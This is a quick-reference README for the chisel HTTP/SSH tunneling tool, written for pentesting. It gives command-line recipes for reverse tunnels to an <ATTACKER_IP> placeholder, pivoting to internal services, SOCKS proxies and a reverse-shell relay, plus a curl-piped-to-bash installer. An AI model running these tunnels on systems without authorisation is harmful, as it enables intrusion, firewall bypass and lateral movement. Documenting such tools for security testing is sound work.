---
title: chisel
category: tunneling
tags:
  - pivoting
  - port-forwarding
  - http-tunnel
  - socks-proxy
description: Fast TCP/UDP tunnel over HTTP, secured via SSH
source: https://github.com/jpillora/chisel
---

# Chisel

Fast TCP/UDP tunnel transported over HTTP, secured via SSH. Single executable for both client and server. Ideal for bypassing firewalls and establishing secure tunnels through HTTP proxies.

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Common Scenarios](#common-scenarios)
- [Documentation](#documentation)

## Overview

Chisel creates encrypted tunnels over HTTP/WebSocket connections using the SSH protocol. Key features:

- **Single binary** - Client and server in one executable
- **SSH encryption** - All traffic secured via crypto/ssh
- **Reverse tunneling** - Forward connections from server to client
- **SOCKS5 proxy** - Built-in SOCKS5 support on both ends
- **Auto-reconnect** - Exponential backoff on disconnection
- **HTTP proxy support** - Traverse CONNECT/SOCKS5 proxies

## Installation

```bash
# Pre-built binary (recommended)
curl https://i.jpillora.com/chisel! | bash

# Go install
go install github.com/jpillora/chisel@latest

# Docker
docker run --rm -it jpillora/chisel --help
```

Download binaries: https://github.com/jpillora/chisel/releases

## Quick Start

### Reverse Tunnel Setup (Pentesting)

On attack box (server):
```bash
chisel server -p 8080 --reverse
```

On target (client):
```bash
chisel client <ATTACKER_IP>:8080 R:9001:127.0.0.1:80
# Exposes target's localhost:80 on attacker's port 9001
```

### Port Forwarding (Access Internal Service)

Server on pivot host:
```bash
chisel server -p 8080
```

Client on attacker:
```bash
chisel client <PIVOT_IP>:8080 3306:10.10.10.5:3306
# Access internal MySQL (10.10.10.5:3306) via localhost:3306
```

### SOCKS5 Proxy

Server with SOCKS enabled:
```bash
chisel server -p 8080 --socks5
```

Client requesting SOCKS:
```bash
chisel client <SERVER_IP>:8080 socks
# SOCKS5 proxy available at 127.0.0.1:1080
```

Reverse SOCKS (proxy from server through client):
```bash
# Server
chisel server -p 8080 --reverse

# Client
chisel client <SERVER_IP>:8080 R:socks
# Server can now use 127.0.0.1:1080 to route through client
```

## Common Scenarios

| Scenario | Server Command | Client Command |
|----------|---------------|----------------|
| Reverse shell relay | `chisel server -p 8080 --reverse` | `chisel client <IP>:8080 R:4444:127.0.0.1:4444` |
| Access internal web | `chisel server -p 8080` | `chisel client <IP>:8080 8000:192.168.1.10:80` |
| SOCKS pivot | `chisel server -p 8080 --socks5` | `chisel client <IP>:8080 socks` |
| Reverse SOCKS | `chisel server -p 8080 --reverse` | `chisel client <IP>:8080 R:socks` |
| Multiple tunnels | `chisel server -p 8080 --reverse` | `chisel client <IP>:8080 R:22:localhost:22 R:80:localhost:80` |
| UDP tunnel | `chisel server -p 8080` | `chisel client <IP>:8080 53:8.8.8.8:53/udp` |
| With auth | `chisel server -p 8080 --auth user:pass` | `chisel client --auth user:pass <IP>:8080 ...` |

### Remote Syntax

```
<local-host>:<local-port>:<remote-host>:<remote-port>/<protocol>

R:<server-interface>:<server-port>:<client-host>:<client-port>  # Reverse
```

Defaults: local-host=0.0.0.0, protocol=tcp, local-port=remote-port

## Documentation

| File | Description |
|------|-------------|
| [README.md](README.md) | This file - quick reference and usage |
| [tunneling.md](tunneling.md) | Comprehensive tunneling guide with scenarios |
| [official_docs.md](official_docs.md) | Full upstream documentation |

## References

- GitHub: https://github.com/jpillora/chisel
- Releases: https://github.com/jpillora/chisel/releases
